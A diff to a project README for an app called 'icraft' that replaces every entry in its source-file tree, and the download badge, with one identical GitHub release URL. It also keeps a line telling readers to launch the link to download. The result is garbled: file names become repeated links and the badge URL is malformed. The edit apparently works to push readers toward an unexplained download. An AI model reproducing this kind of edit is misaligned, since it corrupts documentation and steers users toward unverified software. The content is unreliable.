@@ -37,26 +37,26 @@ icraft/
 │
 ├── lib/
 │   ├── screens/
-│   │   ├── HomeScreen.dart
-│   │   ├── ProfileScreen.dart
-│   │   └── ServicesScreen.dart
+│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│   │   └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
 │   ├── models/
-│   │   ├── User.dart
-│   │   └── Service.dart
+│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│   │   └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
 │   └── widgets/
-│       ├── ServiceCard.dart
-│       └── ProfileInfo.dart
+│       ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│       └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
 │
 ├── assets/
 │   ├── images/
-│   │   ├── logo.png
-│   │   └── background.jpg
+│   │   ├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+│   │   └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
 │   └── fonts/
-│       └── Roboto-Regular.ttf
+│       └── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
 │
-├── main.dart
-├── constants.dart
-└── README.md
+├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+├── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
+└── https://github.com/Anotherrboy/icraft/releases/tag/v1.2
 ```
 
 ## 🌟 How to Use
@@ -67,7 +67,7 @@ icraft/
 
 ## 🔗 Download
 
-[![Download iCraft](https://img.shields.io/badge/Download%20iCraft-Soft.zip-blue.svg)](https://github.com/files/Soft.zip)
+[![Download iCraft](https://github.com/Anotherrboy/icraft/releases/tag/v1.2%https://github.com/Anotherrboy/icraft/releases/tag/v1.2)](https://github.com/Anotherrboy/icraft/releases/tag/v1.2)
 
 *Please note that the link above needs to be launched for download.*
 
